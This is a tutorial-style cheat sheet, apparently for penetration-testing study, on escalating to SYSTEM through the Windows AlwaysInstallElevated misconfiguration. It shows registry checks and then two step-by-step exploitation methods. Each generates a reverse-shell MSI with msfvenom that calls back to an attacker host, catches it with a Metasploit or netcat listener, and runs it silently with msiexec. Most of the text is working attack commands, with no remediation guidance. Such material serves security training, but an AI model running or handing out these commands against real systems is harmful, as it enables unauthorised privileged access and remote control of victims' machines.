**AlwaysInstallElevated** is a Windows Installer misconfiguration that allows an MSI package to be installed with **elevated privileges**.

If both registry settings are `1`, a low-privileged user may be able to execute a malicious `.msi` with **SYSTEM privileges**.

**Attack chain:**
```text
HKCU = 1
HKLM = 1
   ↓
Create malicious MSI
   ↓
msiexec installs MSI
   ↓
MSI executes elevated
   ↓
SYSTEM shell
```

---

# 1. Detection

### Check HKLM
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

Or more precisely:
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Command explanation:**
- `reg` → built-in Windows Registry utility.
- `query` → reads registry values.
- `HKLM` → `HKEY_LOCAL_MACHINE`, system-wide configuration.
- `/v AlwaysInstallElevated` → asks specifically for that registry value.
    

Expected:
```text
AlwaysInstallElevated    REG_DWORD    0x1
```

`0x1` means **enabled**.

---

### Check HKCU

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Explanation:**
- `HKCU` → `HKEY_CURRENT_USER`, settings for the current user.
- `/v` → specifies the exact value to query.
    

You need **both** settings enabled:

```text
HKLM → AlwaysInstallElevated = 1
HKCU → AlwaysInstallElevated = 1
```

If only one is `1`, this technique generally won't work.

---

# 2. Exploitation — Method 1: Meterpreter MSI

### Start Metasploit

On Kali:
```bash
msfconsole
```

### Create a listener
```text
use multi/handler
```
Selects Metasploit's generic payload handler.

```text
set payload windows/meterpreter/reverse_tcp
```
Configures the handler to receive a Windows Meterpreter reverse TCP connection.

```text
set LHOST KALI_IP
```
Sets the IP address that the Windows machine should connect back to.

```text
run
```
Starts the listener.

### Generate the malicious MSI

Open another Kali terminal:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP -f msi -o setup.msi
```

Breakdown:
- `msfvenom` → Metasploit payload-generation utility.
- `-p` → select payload.
- `windows/meterpreter/reverse_tcp` → Windows Meterpreter reverse TCP payload.
- `LHOST=KALI_IP` → Kali's IP address.
- `-f msi` → output format is Windows Installer (`.msi`).
- `-o setup.msi` → save the payload as `setup.msi`.
    

Transfer `setup.msi` to the Windows machine and place it in:

```text
C:\Temp\setup.msi
```

### Execute the MSI

```cmd
msiexec /quiet /qn /i C:\Temp\setup.msi
```

This is the important command.
- `msiexec` → Windows Installer command-line utility.
- `/i` → install the specified MSI.
- `/quiet` → no user interface.
- `/qn` → completely suppress the installer UI.
- `C:\Temp\setup.msi` → malicious MSI package.
    
*`msiexec.exe` is a legitimate **Windows built-in program** used to install MSI packages.

Because **AlwaysInstallElevated** is enabled, the MSI can execute with elevated privileges, resulting in the reverse shell running as **SYSTEM**.

---

# 3. Exploitation — Method 2: `shell_reverse_tcp`

Your second method uses a different payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
```

### What's different?

Instead of:

```text
windows/meterpreter/reverse_tcp
```

it uses:
```text
windows/x64/shell_reverse_tcp
```

This gives you a normal Windows command shell rather than a Meterpreter session.

Breakdown:
- `windows/x64/` → 64-bit Windows payload.
- `shell_reverse_tcp` → reverse TCP command shell.
- `LHOST` → attacker's IP.
- `LPORT` → attacker's listening port.
- `-f msi` → generate an MSI.
- `-o reverse.msi` → output filename.
    

Then transfer:
```text
reverse.msi → C:\PrivEsc\reverse.msi
```

Start a listener on Kali:
```bash
nc -lvnp 53
```

- `nc` → Netcat.
- `-l` → listen.
- `-v` → verbose.
- `-n` → don't perform DNS resolution.
- `-p 53` → listen on port 53.

Then execute:
```cmd
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

The MSI executes with elevated privileges and connects back to the Netcat listener.

---

## Method 1 vs Method 2

|           | Method 1                          | Method 2                        |
| --------- | --------------------------------- | ------------------------------- |
| Payload   | Meterpreter                       | Windows shell                   |
| Payload   | `windows/meterpreter/reverse_tcp` | `windows/x64/shell_reverse_tcp` |
| Listener  | Metasploit                        | Netcat                          |
| Session   | Meterpreter                       | Normal `cmd.exe` shell          |


### Key commands to remember

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be:
```text
0x1
```

Generate MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o reverse.msi
```

Execute:
```cmd
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

**Important:** `reg.exe` and `msiexec.exe` are **built into Windows**. `msfconsole`, `msfvenom`, and `nc` are **third-party tools**, commonly used from Kali.

**Key idea:**

> `HKCU=1 + HKLM=1 → malicious MSI → msiexec → elevated execution → SYSTEM shell.`